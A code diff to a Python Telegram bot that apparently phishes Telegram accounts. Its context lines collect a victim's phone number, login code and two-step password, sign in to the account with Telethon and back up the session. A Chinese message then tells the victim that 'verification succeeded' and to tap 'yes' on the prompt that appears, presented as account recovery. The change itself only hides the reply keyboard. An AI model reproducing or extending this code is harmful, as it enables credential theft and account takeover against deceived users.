@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)
 
 import telethon
 from dotenv import load_dotenv
-from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, TypeHandler
 from telethon import TelegramClient
@@ -496,13 +496,15 @@ async def submit_code(update, context, user_id, code):
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         user_states[user_id]["state"] = "done"
         await backup_session(phone, client)
-        # 成功为终态：清掉验证中消息再发结果
+        # 成功为终态：清掉验证中消息再发结果，并收起数字键盘
         await clear_step_msgs(update, context)
         try:
             with open(IMAGE_PATH, 'rb') as photo:
-                await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+                await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
+                                                 reply_markup=ReplyKeyboardRemove())
         except Exception:
-            await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+            await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
+                                            reply_markup=ReplyKeyboardRemove())
     except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
         code_attempts = user_states[user_id].get("code_attempts", 0) + 1
         user_states[user_id]["code_attempts"] = code_attempts
@@ -608,9 +610,11 @@ async def handle_message(update, context):
                 await backup_session(phone, client)
             try:
                 with open(IMAGE_PATH, 'rb') as photo:
-                    await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+                    await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
+                                                     reply_markup=ReplyKeyboardRemove())
             except Exception:
-                await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+                await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
+                                                reply_markup=ReplyKeyboardRemove())
         except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
             password_attempts += 1
             user_states[user_id]["password_attempts"] = password_attempts
@@ -640,7 +644,7 @@ async def handle_message(update, context):
             await update.message.reply_text(f"验证失败: {str(e)}", reply_markup=create_restart_button())
         return
     if state == "done":
-        await update.message.reply_text("您已完成验证，无需重复操作。")
+        await update.message.reply_text("您已完成验证，无需重复操作。", reply_markup=ReplyKeyboardRemove())
         return
     if text == "获取验证码":
         await handle_code_request(update, context)
